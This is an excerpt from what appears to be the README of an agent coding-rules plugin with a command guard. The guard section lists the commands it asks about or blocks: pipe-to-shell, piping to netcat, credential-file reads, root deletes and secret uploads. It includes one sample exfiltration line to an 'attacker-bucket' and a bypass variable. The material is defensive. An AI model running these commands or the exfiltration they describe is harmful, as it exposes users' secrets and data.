...
- **The right rules, every prompt** — 118 rules in YAML; a hook injects only the ones relevant to your task, plus an always-on mandatory set (security, testing). Nothing to remember, no context bloat.
...
**Make them *your* standards.** The 118 built-in rules are a starting point. Add your own in seconds — run `/clawness:add describe your rule` and Clawness writes the tagged YAML for you (asking before it saves), or drop `.yml` files in `.clawness/rules/`. Commit `.clawness/` and your whole team shares the same rules. → [Per-Project Setup](#per-project-setup) · [Writing Rules](#writing-rules)
...
- **`ask`** — surfaces a confirmation prompt you can approve or reject. Used for *dual-use* and scope cases: pipe-to-shell (`curl … | sh`, like official installers), `git push --force` (but **not** `--force-with-lease`, which is allowed), writes **outside** the project root, reads of credential files **outside** the project (`~/.ssh`, `~/.aws`, another repo), named package installs, a recursive delete *under* a system dir (`rm -rf /var/cache/…`), data piped into a raw socket (`… | nc host`), **any** cloud-storage upload (`aws s3 cp … s3://…`, `gsutil`, `az blob` — asked even for a bucket your repo names, since source is forgeable), a data-bearing or token-carrying network call to an **external** host (a POST/PUT with a body, an upload, or a `$TOKEN` in the request — whether or not the host is in your codebase; being in it only keeps the call from escalating toward the exfil deny), downloading a credential-named URL, and editing the guard's own config. **Asked once per target per session** — the dedup key is the *destination* (host/bucket) for network egress, so iterating upload payloads to the same host prompts only once.
- **`deny`** — a **hard block** with no inline override (verified on the VS Code build: retrying just re-fires it). Kept deliberately narrow — reserved for things you'd essentially never want a sleepy "yes" to push through: cloud-metadata endpoints, a recursive delete of a filesystem root / home / a *system dir itself* (`rm -rf /`, `/etc`), reading a local secret file into a network command, uploading a local secret, and **embedding captured command output** (`$(…)`, backticks) in an upload to a host that appears **nowhere** in your codebase (the exfil signature). A plain token env var (`Bearer $API_TOKEN`) is routine auth and only *asks* — it never hard-blocks. To proceed past a deny you run it yourself in a terminal, or set `CLAW_NO_ACCESS_GUARD=1` and re-issue.

It is tuned to **stay out of normal dev work**: reading your *own* project's `.env`/keys, plain API **GET**s, lockfile restores (`npm ci`, `pip install -r …`), local/loopback traffic, and `--force-with-lease` stay silent. A data-bearing or token-authenticated call to an *external* host asks **once per host per session** — hardcoding the host in your source keeps it an ask (rather than escalating toward the exfil deny), but doesn't silence it; and reaching *outside* the project for secrets or touching the guard's kill-switches also prompts. See the [tripwire caveat](#what-problem-does-this-solve) — it's harm reduction, not a sandbox.
...
- **MaliciousCorgi VS Code "AI assistant" extensions (Jan 2026)** — two fake AI coding extensions (~1.5M installs) remotely triggered to exfiltrate workspace files. → the guard flags data sent to a host absent from your codebase (asks, or hard-denies when it embeds captured file contents); `ENF-SEC-006` treats injected instructions as data. [The Hacker News](https://thehackernews.com/2026/01/malicious-vs-code-ai-extensions-with-15.html)
...
- **`nx` / Shai-Hulud npm supply-chain worms (2025–2026)** — a compromised package's `postinstall` harvested AWS/GCP/Azure keys and exfiltrated data to attacker infrastructure: a hardcoded webhook, a public GitHub repo, and — in the `nx`/UNC6426 case — straight out of the victim's **S3 buckets**. → this is why **every cloud upload now prompts** (`aws s3 cp`/`gsutil`/`az blob`), even to a bucket named in your own source. A malicious dependency can *write* its exfil bucket into your code to look "trusted," so the guard deliberately won't silence a cloud upload on that basis (v0.7.1) — `aws s3 cp <secrets> s3://attacker-bucket` surfaces a confirmation even under a broad allowlist. [The Hacker News](https://thehackernews.com/2026/03/unc6426-exploits-nx-npm-supply-chain.html)
...
|-----------|-------|---------|
| **Rules** | 118 across 18 domains | Coding standards, injected per-prompt |
